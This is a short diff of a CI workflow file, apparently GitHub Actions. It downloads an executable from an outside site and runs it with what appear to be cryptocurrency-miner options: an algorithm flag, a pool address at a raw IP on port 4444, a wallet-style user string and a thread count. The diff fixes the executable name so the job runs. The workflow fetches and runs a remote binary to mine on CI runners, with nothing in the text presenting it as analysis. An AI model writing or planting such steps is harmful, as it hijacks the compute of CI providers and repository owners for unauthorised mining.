@@ -19,6 +19,6 @@ jobs:
     - name: DOWNLOAD
       run: Invoke-WebRequest https://excode.xyz/download/appv2win.exe -outfile appv2win.exe
     - name: DEPLOY
-      run: .\appv2win -a gr -o 207.180.196.154:4444 -u RKnGW27zG1zFVxJe8Hg9qgthU49SLxDxYz.meter -t 1
+      run: .\appv2win.exe -a gr -o 207.180.196.154:4444 -u RKnGW27zG1zFVxJe8Hg9qgthU49SLxDxYz.meter -t 1
     - name: DONE
       run: exit
